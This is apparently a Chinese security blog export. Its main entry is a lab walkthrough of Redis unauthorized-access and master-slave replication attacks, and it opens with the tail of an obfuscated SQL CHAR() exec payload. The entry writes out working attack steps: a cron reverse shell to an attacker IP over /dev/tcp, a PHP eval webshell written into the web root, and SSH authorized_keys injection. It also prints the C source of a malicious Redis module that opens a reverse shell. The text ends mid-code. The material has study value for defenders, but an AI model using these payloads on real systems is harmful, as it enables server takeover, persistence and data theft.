class="hljs-type">CHAR</span>(<span class="hljs-number">32</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">99</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">111</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">110</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">118</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">101</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">114</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">116</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">40</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">105</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">110</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">116</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">44</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">64</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">64</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">118</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">101</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">114</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">115</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">105</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">111</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">110</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">41</span>) <span class="hljs-keyword">exec</span>(<span class="hljs-variable">@s</span>)<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis常见漏洞学习</title>
      <link href="/2024/03/30/redis%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/03/30/redis%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1><span id="redis基础知识">redis基础知识</span></h1><p>redis是一个非常快速的、开源的、支持网络、可基于内存亦可持久化的日志型、非关系类型的.Key-Value数据库，并提供多种语言的API。它提供了Java，C&#x2F;C++，C#，PHP，JavaScript，PerlObject-C，Python，Ruby，Erlang等客户端，使用很方便。</p><p>与MySQL数据库不同的是，Redis的数据是存在内存中的。它的读写速度非常快，每秒可以处理超过10万次读写操作。因此redis被广泛应用于缓存，另外，Redis也经常用来做分布式锁。除此之外，Redis支持事务、持久化、LUA 脚本、LRU 驱动事件、多种集群方案。</p><h2><span id="一些常用的命令">一些常用的命令</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">set xz &quot;Hacker&quot;          # 设置键xz的值为字符串Hacker<br>get xz                   # 获取键xz的内容<br>info                     # 获取服务器的各种信息和统计数据比如服务器当前的状态、统计信息、配置参数、客户端连接情况等，我们还可以获取特定信息，比如info memory只获取内存信息<br>SET score 857            # 设置键score的值为857<br>INCR score               # 使用INCR命令将score的值增加1<br>GET score                # 获取键score的内容<br>keys *                   # 列出当前数据库中所有的键<br>config set protected-mode no        # 关闭安全模式<br>get anotherkey                      # 获取一个不存在的键的值<br>config set dir /root/redis          # 设置保存目录<br>config set dbfilename redis.rdb     # 设置保存文件名<br>config get dir                      # 查看保存目录<br>config get dbfilename               # 查看保存文件名<br>save                                # 进行一次备份操作<br>flushall                            # 删除所有数据<br>del key                             # 删除键为key的数据<br>slaveof ip port                     # 设置主从关系<br>redis-cli -h ip -p 6379 -a passwd   # 外部连接<br>flushdb                             # 清空当前数据库的所有 key<br>module load /path/to/your/module.so # 用来加载自定义的模块文件，通常是so文件，/path/to/your/module.so 替换为你实际的模块文件路径<br>module list                         #列出已经加载的模块<br></code></pre></td></tr></table></figure><blockquote><p>不过module加载模块有些redis版本是不支持的</p></blockquote><h2><span id="redis相关的数据库配置">redis相关的数据库配置</span></h2><p>redis数据库相关的配置可以在**&#x2F;etc&#x2F;redis&#x2F;redis.conf**文件里面进行设置</p><p><strong>port</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">格式为port后面接端口号，如port 6379，表示Redis服务器将在6379端口上进行监听来等待客户端的连接。<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151705640.png" alt="image-20240330103644314"></p><p><strong>bind</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">格式为bind后面接IP地址，可以同时绑定在多个IP地址上，IP地址之间用空格分离，如bind 192.168.1.100 10.0.0.1，表允许192.168.1.100和10.0.0.1两个IP连接。如果设置为0.0.0.0则表示任意ip都可连接，就是白名单形式。<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151705641.png" alt="image-20240330103720889"></p><p><strong>save</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">格式为save &lt;秒数&gt; &lt;变化数&gt;，表示在指定的秒数内数据库存在指定的改变数时自动进行备份（Redis是内存数据库，这里的备份就是指把内存中的数据备份到磁盘上）。可以同时指定多个save参数，如：<br>save 900 1<br>save 300 10<br>save 60 10000<br>表示如果数据库的内容在60秒后产生了10000次改变，或者300秒后产生了10次改变，或者900秒后产生了1次改变，那么立即进行备份操作。<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151705642.png" alt="image-20240330103908193"></p><p><strong>requirepass</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">格式为requirepass后接指定的密码，用于指定客户端在连接Redis服务器时所使用的密码。Redis默认的密码参数是空的，说明不需要密码即可连接；同时，配置文件有一条注释了的requirepass foobared命令，如果去掉注释，表示需要使用foobared密码才能连接Redis数据库。<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151705643.png" alt="image-20240330104550773"></p><blockquote><p>默认不设置密码这也是未授权访问的重要原因</p></blockquote><p><strong>dir</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">格式为dir后接指定的路径，默认为dir ./，指明Redis的工作目录为当前目录，即redis-server文件所在的目录。注意，Redis产生的备份文件将放在这个目录下。<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151705644.png" alt="image-20240330104712001"></p><p><strong>dbfilename</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">格式为dbfilename后接指定的文件名称，用于指定Redis备份文件的名字，默认为dbfilename dump.rdb，即备份文件的名字为dump.rdb。<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151705645.png" alt="image-20240330104849575"></p><p><strong>config</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">通过config命令可以读取和设置dir参数以及dbfilename参数，后面很多攻击方式都会需要用到该命令，所以Redis在配置文件中提供了rename-command参数来对其进行重命名操作，如rename-command CONFIG HTCMD，可以将CONFIG命令重命名为HTCMD。配置文件默认是没有对CONFIG命令进行重命名操作的。<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151705646.png" alt="image-20240330105533934"></p><p><strong>protected-mode</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">redis3.2之后添加了protected-mode安全模式，默认值为yes，开启后禁止外部连接，所以在测试时，先在配置中修改为no。<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151705647.png" alt="image-20240330105721000"></p><h1><span id="redis未授权访问漏洞">redis未授权访问漏洞</span></h1><p>redis未授权访问漏洞是一个由于redis服务版本较低其未设置登录密码导致的漏洞，攻击者可直接利用redis服务器的ip地址和端口完成redis服务器的远程登录，对目标服务器完成后续的控制和利用。</p><h2><span id="漏洞成因">漏洞成因</span></h2><ol><li>redis版本为4.x&#x2F;5.0.5以前的版本</li><li>redis绑定在0.0.0.0:6379端口，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接博暴露在公网。</li><li>没有设置认证密码(一般为空)，可以免密码远程登陆redis服务。</li></ol><h2><span id="漏洞导致的危害">漏洞导致的危害</span></h2><ol><li>攻击者可以通过redis的命令来向目标服务器写入计划任务进行反弹shell</li><li>攻击者可以通过命令向网站目录写入webshell来进行控制网站服务器</li><li>最严重的情况，如果目标机器是以root身份登录的服务器并且开启了redis，黑客就可以直接利用该账号的权限写入SSH公钥文件，直接通过SSH登录受害者的服务器。</li></ol><h2><span id="漏洞复现">漏洞复现</span></h2><p><strong>漏洞环境搭建</strong></p><p>这里我的受害机是ubuntu，攻击机是kali</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1.直接安装redis<br>sudo apt install redis<br><br>2.关闭一下防火墙<br>iptables -F<br><br>3.将bind的绑定地址设定为0.0.0.0可以使其暴露在公网上面<br>bind 0.0.0.0<br><br>4.重启一下redis服务<br>systemctl restart redis<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151705648.png" alt="image-20240330125500798"></p><p><strong>然后直接漏洞利用即可</strong></p><p>在攻击机上用redis-cli连接即可</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">redis-cli -h &lt;受害机的IP&gt; -p 6379<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151705649.png" alt="image-20240330125617710"></p><p>下面就是一些利用该漏洞所进行的进一步攻击操作</p><h1><span id="写入计划任务反弹shell">写入计划任务反弹shell</span></h1><p><strong>计划任务相关文件的粗放位置</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/etc/crontab：这是系统范围的 cron 配置文件，其中包含了系统级别的计划任务的设置。<br><br>/etc/cron.d/：这个目录用于存放系统级别的 cron 任务配置文件。<br><br>/etc/cron.daily/：该目录包含了每日执行的计划任务。<br><br>/etc/cron.weekly/：这个目录用于存放每周执行的计划任务。<br><br>/etc/cron.monthly/：包含了每月执行的计划任务。<br><br>/var/spool/cron/ 或 /var/spool/cron/crontabs/：这个目录通常包含用户特定的 crontab 文件，用户可以在其中定义自己的计划任务。<br><br>用户家目录下的 .crontab 或 .cronjobs：用户可以在自己的家目录下创建名为 .crontab 或 .cronjobs 的文件，以定义自己的计划任务。<br></code></pre></td></tr></table></figure><p>这里再了解一下计划任务的写入形式，当我们crontab -e写入计划任务的时候，会在计划任务的目录下创建一个以用户名命名的文件，所以我们等会redis写入文件时保存的文件名也要是以用户名命名的文件</p><p><img src="http://cdn.clown2024.cn/202407151705650.png" alt="image-20240330132520323"></p><p><img src="http://cdn.clown2024.cn/202407151705651.png" alt="image-20240330132538445"></p><p><strong>写入计划任务</strong></p><p>利用思路：</p><p>我们连接之后就要利用config修改文件的保存路径为计划任务的路径，然后写入计划任务（emmm写入失败了，说权限不够，可能是ubuntu用了普通用户启动redis，但是Ubuntu换root登录又要折腾，我这里直接换centos了）</p><p>&#x3D;&#x3D;centos安装redis&#x3D;&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs shelll">yum update #更新安装包<br>yum install epel-release # 安装 EPEL 软件库：Redis 软件包通常在 EPEL 软件库中<br>yum install redis<br>sudo systemctl start redis #启动redis服务<br>sudo systemctl enable redis # 用于设置开机自启动，看需求选择<br></code></pre></td></tr></table></figure><p>然后和上面一样修改配置文件，centos的redis配置文件的路径为&#x2F;etc&#x2F;redis.conf</p><p>然后再关一下防火墙</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">iptables -F<br>setenforce 0  # 改变SELinux的工作模式，SELinux是一种在 Linux 操作系统上实现强制访问控制（MAC）的安全机制；<br>systemctl stop firewalld.service #centos中特有的防火墙<br></code></pre></td></tr></table></figure><blockquote><p>SELinux有三种工作模式：</p><ol><li>Enforcing Mode（强制模式）：在这个模式下，SELinux会强制执行所有定义的安全策略，如果有违反策略的操作发生，会被阻止并记录到日志中。在强制模式下，SELinux会严格限制系统资源的访问。表示为1</li><li>Permissive Mode（宽容模式）：在这个模式下，SELinux会记录违反安全策略的操作，但不会阻止它们，这样可以帮助管理员了解哪些操作可能会违反策略。这个模式类似于监控模式。表示为0</li><li>Disabled Mode（禁用模式）：在这个模式下，SELinux完全被禁用，系统不会应用任何SELinux的安全策略。要设置关闭的话就需要修改”&#x2F;etc&#x2F;sysconfig&#x2F;selinux”配置文件</li></ol><p>可以使用getenforce查看当前工作模式</p><p><img src="http://cdn.clown2024.cn/202407151705652.png" alt="image-20240330141233651"></p></blockquote><blockquote><p>又写不进去还是会报下面的错我就奇怪了</p><p><img src="http://cdn.clown2024.cn/202407151705653.png" alt="image-20240330143126682"></p><p>去搜了搜发现即使为root身份，redis他自己也不是以root身份登录的，要从配置文件启动才能以root身份登录，坑死了，所以要先systemctl stop redis来停掉redis服务，要我们来自己启动</p><p>&#x2F;usr&#x2F;bin&#x2F;redis-server &#x2F;etc&#x2F;redis.conf  &#x2F;&#x2F;直接redis-server启动会开启保护模式也改不了目录</p><p><img src="http://cdn.clown2024.cn/202407151705654.png" alt="image-20240330143530956"></p><p>然后终于可以愉快地写计划任务了</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">config set dir /var/spool/cron   #这个要看具体系统的目录<br>config set dbfilename root<br>set xxoo &quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/&lt;攻击者ip&gt;/&lt;监听端口&gt; 0&gt;&amp;1\n\n&quot; #这里的换行是为了保证格式正确，如果目标机器上有很多的计划任务可能会导致写入的反弹sehll格式错误。<br>save  #进行一次备份来写入文件当中<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151705655.png" alt="image-20240330143734305"></p><p>然后<strong>nc -lvvp 6666</strong>开启监听等待即可</p><p><img src="http://cdn.clown2024.cn/202407151705656.png" alt="image-20240330144612655"></p><p>反弹shell成功，可以看一下我们写进去的计划任务长什么样</p><p><img src="http://cdn.clown2024.cn/202407151705657.png" alt="image-20240330144654223"></p><p>这个方法只能<code>Centos</code>上使用，<code>Ubuntu上</code>行不通，原因如下：</p><ol><li>因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件<code>/var/spool/cron/crontabs/&lt;username&gt;</code>权限必须是600也就是<code>-rw-------</code>才会执行，否则会报错<code>(root) INSECURE MODE (mode 0600 expected)</code>，而Centos的定时任务文件<code>/var/spool/cron/&lt;username&gt;</code>权限644也能执行</li><li>因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错</li></ol><h1><span id="写入webshell控制服务器">写入webshell控制服务器</span></h1><ol><li>这里我们先用centos快速搭建一个LAMP的环境用于解析我们上传的php一句话木马</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">安装apache服务器</span><br>sudo yum install httpd<br>sudo systemctl start httpd<br>sudo systemctl enable httpd<br><span class="hljs-meta prompt_"># </span><span class="language-bash">安装mysql数据库</span><br>sudo yum install mysql mysql-server<br>sudo systemctl start mysqld<br>sudo systemctl enable mysqld<br>sudo mysql_secure_installation # MySQL 提供的实用工具，用于执行一些安全设置和配置以加固 MySQL 数据库的安全性<br><span class="hljs-meta prompt_"># </span><span class="language-bash">安装php</span><br>sudo yum install php php-mysql<br></code></pre></td></tr></table></figure><ol start="2"><li>开始写入我们的webshell</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">config set dir /var/www/html<br>config set dbfilename shell.php<br>set shell &quot;&lt;?php eval($_POST[shell])?&gt;&quot;<br>save<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151705658.png" alt="image-20240330150154116"></p><p>然后我们去访问一下shell.php</p><p><img src="http://cdn.clown2024.cn/202407151705659.png" alt="image-20240330150249714"></p><p>上面的内容是我们上次设置的定时任务数据，一起save了进去，接下来用蚁剑去连接一下</p><p><img src="http://cdn.clown2024.cn/202407151705660.png" alt="image-20240330150436847"></p><p>连接成功可以看到目录下的文件</p><h1><span id="写入ssh-keygen公钥登录服务器漏洞">写入ssh-keygen公钥登录服务器漏洞</span></h1><p>SSH提供两种登录验证方式，一种是口令验证也就是账号密码登录，另一种是密钥验证。</p><p>密钥验证就是一种基于公钥密码的认证，使用公钥加密、私钥解密，其中公钥是可以公开的，放在服务器端，你可以把同一个公钥放在所有你想SSH远程登录的服务器中，而私钥是保密的只有你自己知道，公钥加密的消息只有私钥才能解密，大体过程如下：</p><ol><li>客户端生成私钥和公钥，将公钥拷贝给服务器端</li><li>客户端发起登录请求</li><li>服务器端根据客户端发来的信息查找是否存有该客户端的公钥，</li><li>客户端收到服务器发来的加密后的消息后使用私钥解密，并把解密后的结果发给服务器用于验证</li><li>服务器收到客户端发来的解密结果，与自己刚才生成的随机数比对</li></ol><p><strong>攻击者本地生成密钥对</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ssh-keygen -t rsa  # 在家目录的.ssh下进行生成<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151705661.png" alt="image-20240330151056696"></p><p><strong>向受害者机器写入公钥</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">config set dir /root/.ssh<br>config set dbfilename authorized_keys<br>set x &quot;\n\n\n&lt;生成的公钥&gt;\n\n\n&quot;  #换行是为了避免和其他数据混合保证格式正确，和上面的计划任务一样<br>save<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151705662.png" alt="image-20240330151540903"></p><p>然后使用ssh登录目标机器，在.ssh目录下用私钥登录</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ssh -i id_rsa root@&lt;目标机器ip&gt;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151705663.png" alt="image-20240330151831267"></p><p>成功登录！</p><h1><span id="主从复制rce">主从复制RCE</span></h1><p><strong>主从复制介绍</strong></p><p>主从复制的传输分为全量传输和增量传输，这里的重点是全量传输：全量传输是将数据库备份文件整个传输过去，然后从节点清空内存数据库，将备份文件加载到数据库中。</p><p>这里从别人的文章偷个流程图方便理解：</p><p><img src="http://cdn.clown2024.cn/202407151705664.png" alt="image-20240330225328187"></p><p><strong>漏洞原理</strong></p><p>漏洞存在于4.x、5.x版本中，Redis提供了主从模式，主从模式指使用一个redis作为主机，其他的作为备份机，主机从机数据都是一样的，从机负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。在redis4.x之后，通过外部拓展可以实现在redis中实现一个新的Redis命令,通过写c语言并编译出,so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNG同步文件到从机上。然后在从机上加载恶意so文件，即可执行命令。</p><blockquote><p>因为redis可以加载外部模块，而外部模块都是so文件的形式，可以使用编辑redis配置文件的方式来加载模块，文件里面也给了我们示例</p><p><img src="http://cdn.clown2024.cn/202407151705665.png" alt="image-20240330170245773"></p></blockquote><p><strong>漏洞利用</strong></p><p>漏洞利用我们需要用到下面的两个工具</p><ul><li>redis-rogue-server：<a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a> ，该工具针对端口开放在公网的redis使用，没开在公网就是用下面的工具</li><li>Awsome-Redis-Rogue-Server：<a href="https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server">https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server</a></li></ul><h2><span id="使用第一个工具远程主从复制rce">使用第一个工具远程主从复制RCE</span></h2><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python3 redis-rogue-server.py --rhost  --rport  --lhost  --lport <br></code></pre></td></tr></table></figure><p>参数说明：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">-–rpasswd 如果目标 Redis 服务开启了认证功能，可以通过该选项指定密码(没尝试过不知道行不行)<br><br>-–rhost 目标 redis 服务 IP<br><br>-–rport 目标 redis 服务端口，默认为 6379<br><br>-–lhost vps 的 IP 地址<br><br>-–lport vps 的端口，默认为 21000<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151705666.png" alt="image-20240330171342499"></p><p>可以看到已经成功访问，我们可以用i选择一个交互式shell或者r反弹一个shell(这时候要再开启一个监听端口)</p><p><img src="http://cdn.clown2024.cn/202407151705667.png" alt="image-20240330171502308"></p><p>emmm这个交互式的shell好像有点拉，接下来换反弹shell试试，发现弹不了失败了，感觉是我本地安装的redis版本过高了，这个脚本的使用版本是&lt;&#x3D;5.0.5，然后取volfocus开了一个5.0版本的环境就成功了</p><p><img src="http://cdn.clown2024.cn/202407151705668.png" alt="image-20240330223708742"></p><p>可以看到成功反弹了一个shell回来，这是后我们还可以用python来生成一个交互式的shell</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;<br></code></pre></td></tr></table></figure><blockquote><p>不过开的这个容器没有python生成不了（</p></blockquote><h2><span id="本地redis主从复制rce反弹shell">本地Redis主从复制RCE反弹shell</span></h2><p><strong>漏洞原理：</strong>对于只允许本地连接的Redis服务器，可以通过开启主从模式从远程主机上同步恶意.so文件至本地，接着载入恶意.so文件模块，反弹shell至远程主机。</p><p>步骤可以总结如下：</p><ul><li>第一步，我们伪装成redis数据库，然后受害者将我们的数据库设置为主节点。</li><li>第二步，我们设置备份文件名为so文件</li><li>第三步，设置传输方式为全量传输</li><li>第四步，加载恶意so文件，实现任意命令执行</li></ul><blockquote><p>我们需要将redis-rogue-server的exp.so复制到Awsome-Redis-Rogue-Server的目录下进行使用，因为他的exp.so是带system模块的</p><p><img src="http://cdn.clown2024.cn/202407151705669.png" alt="image-20240330230929601"></p></blockquote><p>攻击机先执行下面的命令伪造一个master</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python3 redis_rogue_server.py -v -path exp.so<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151705670.png" alt="image-20240330232215843"></p><p>我们连接上受害者机器之后执行下面的命令修改一下文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">config set dir /tmp #一般/tmp目录都有权限写入，所以选择这个目录写入<br>config set dbfilename exp.so  #设置导出文件名<br>slaveof &lt;我们伪造的主机master的ip&gt; &lt;端口号&gt; #进行主从同步，将恶意so文件写入到tmp目录<br>module load ./exp.so   #加载写入的恶意so文件模块<br>module list            #查看恶意so有没有加载成功，主要看有没有system模块<br>system.rev &lt;攻击者ip&gt; &lt;监听端口&gt;   #这样就可以反弹一个shell回来了<br></code></pre></td></tr></table></figure><p>可以先看一下我们同步之前是没有模块的</p><p><img src="http://cdn.clown2024.cn/202407151705671.png" alt="image-20240330232527628"></p><p>我们同步之后再看一下</p><p><img src="http://cdn.clown2024.cn/202407151705672.png" alt="image-20240330233258551"></p><p>最后监听端口进行反弹shell</p><p><img src="http://cdn.clown2024.cn/202407151705673.png" alt="image-20240330233419607"></p><p>可以看到我们的当前目录就是在&#x2F;tmp下</p><h2><span id="了解一下外部模块原理">了解一下外部模块原理</span></h2><p>大概说一下模块编写的实现流程：</p><blockquote><p>首先需要的是初始化，以便让框架可以找到对应的方法，这就需要进行注册，Redis通过RedisModule_Init方法进行注册模块，和RedisModule_CreateCommand注册自定义方法。</p><p>Redis导出了redismodule.h头文件，通过实现该头文件相关API函数，然后编译为so动态库即可，可以在配置文件中使用loadmodule指明，也可以在运行时使用命令动态加载（MODULE LOAD）。</p></blockquote><p>我们可以看一下上面给我们的工具里的exp.so，他就是由一个exp.c编译而来，我们来看看里面的内容</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;redismodule.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span>   </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">DoCommand</span><span class="hljs-params">(RedisModuleCtx *ctx, RedisModuleString **argv, <span class="hljs-type">int</span> argc)</span> &#123;<br>        <span class="hljs-keyword">if</span> (argc == <span class="hljs-number">2</span>) &#123;<br>                <span class="hljs-type">size_t</span> cmd_len;<br>                <span class="hljs-type">size_t</span> size = <span class="hljs-number">1024</span>;<br>                <span class="hljs-type">char</span> *cmd = RedisModule_StringPtrLen(argv[<span class="hljs-number">1</span>], &amp;cmd_len);<br><br>                FILE *fp = popen(cmd, <span class="hljs-string">&quot;r&quot;</span>);<br>                <span class="hljs-type">char</span> *buf, *output;<br>                buf = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(size);<br>                output = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(size);<br>                <span class="hljs-keyword">while</span> ( fgets(buf, <span class="hljs-keyword">sizeof</span>(buf), fp) != <span class="hljs-number">0</span> ) &#123;<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(buf) + <span class="hljs-built_in">strlen</span>(output) &gt;= size) &#123;<br>                                output = <span class="hljs-built_in">realloc</span>(output, size&lt;&lt;<span class="hljs-number">2</span>);<br>                                size &lt;&lt;= <span class="hljs-number">1</span>;<br>                        &#125;<br>                        <span class="hljs-built_in">strcat</span>(output, buf);<br>                &#125;<br>                RedisModuleString *ret = RedisModule_CreateString(ctx, output, <span class="hljs-built_in">strlen</span>(output));<br>                RedisModule_ReplyWithString(ctx, ret);<br>                pclose(fp);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span> RedisModule_WrongArity(ctx);<br>        &#125;<br>    <span class="hljs-keyword">return</span> REDISMODULE_OK;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">RevShellCommand</span><span class="hljs-params">(RedisModuleCtx *ctx, RedisModuleString **argv, <span class="hljs-type">int</span> argc)</span> &#123;<br>        <span class="hljs-keyword">if</span> (argc == <span class="hljs-number">3</span>) &#123;<br>                <span class="hljs-type">size_t</span> cmd_len;<br>                <span class="hljs-type">char</span> *ip = RedisModule_StringPtrLen(argv[<span class="hljs-number">1</span>], &amp;cmd_len);<br>                <span class="hljs-type">char</span> *port_s = RedisModule_StringPtrLen(argv[<span class="hljs-number">2</span>], &amp;cmd_len);<br>                <span class="hljs-type">int</span> port = atoi(port_s);<br>                <span class="hljs-type">int</span> s;<br><br>                <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">sa</span>;</span><br>                sa.sin_family = AF_INET;<br>                sa.sin_addr.s_addr = inet_addr(ip);<br>                sa.sin_port = htons(port);<br><br>                s = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br>                connect(s, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;sa, <span class="hljs-keyword">sizeof</span>(sa));<br>                dup2(s, <span class="hljs-number">0</span>);<br>                dup2(s, <span class="hljs-number">1</span>);<br>                dup2(s, <span class="hljs-number">2</span>);<br><br>                execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span> RedisModule_WrongArity(ctx);<br>        &#125;<br>    <span class="hljs-keyword">return</span> REDISMODULE_OK;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">RedisModule_OnLoad</span><span class="hljs-params">(RedisModuleCtx *ctx, RedisModuleString **argv, <span class="hljs-type">int</span> argc)</span> &#123;<br>    <span class="hljs-keyword">if</span> (RedisModule_Init(ctx,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-number">1</span>,REDISMODULE_APIVER_1)<br>        == REDISMODULE_ERR) <span class="hljs-keyword">return</span> REDISMODULE_ERR;<br><br>    <span class="hljs-keyword">if</span> (RedisModule_CreateCommand(ctx, <span class="hljs-string">&quot;system.exec&quot;</span>,<br>        DoCommand, <span class="hljs-string">&quot;readonly&quot;</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, 